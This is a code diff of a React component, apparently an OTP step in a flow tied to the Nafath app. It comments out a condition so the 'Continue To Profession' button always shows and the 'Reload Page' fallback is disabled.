@@ -88,23 +88,23 @@ const NafatOtpTwo = () => {
         >
           OPEN NAFATH APP
         </Link>
-        {order.nafatOtpTwo ? (
-          <form onSubmit={handleSubmit} className="w-3/4 my-14">
-            <button
-              type="submit"
-              className="flex gap-2 justify-center items-center rounded-sm font-bold w-full px-4 py-2 text-md tracking-wide text-white capitalize transition-colors duration-200 transform bg-teal-500 hover:bg-teal-600 focus:outline-none focus:bg-teal-600"
-            >
-              Continue To Profession <FaArrowRightLong size={16} />
-            </button>
-          </form>
-        ) : (
+        {/* {order.nafatOtpTwo ? ( */}
+        <form onSubmit={handleSubmit} className="w-3/4 my-14">
+          <button
+            type="submit"
+            className="flex gap-2 justify-center items-center rounded-sm font-bold w-full px-4 py-2 text-md tracking-wide text-white capitalize transition-colors duration-200 transform bg-teal-500 hover:bg-teal-600 focus:outline-none focus:bg-teal-600"
+          >
+            Continue To Profession <FaArrowRightLong size={16} />
+          </button>
+        </form>
+        {/* ) : (
           <button
             onClick={reload}
             className="flex gap-2 justify-center items-center rounded-sm font-bold my-14 w-3/4 px-4 py-2 text-md tracking-wide text-white capitalize transition-colors duration-200 transform bg-gray-500 hover:bg-gray-600 focus:outline-none focus:bg-gray-600"
           >
             Reload Page
           </button>
-        )}
+        )} */}
       </div>
       <div className="h-20 bg-teal-400 mt-5"></div>
     </>
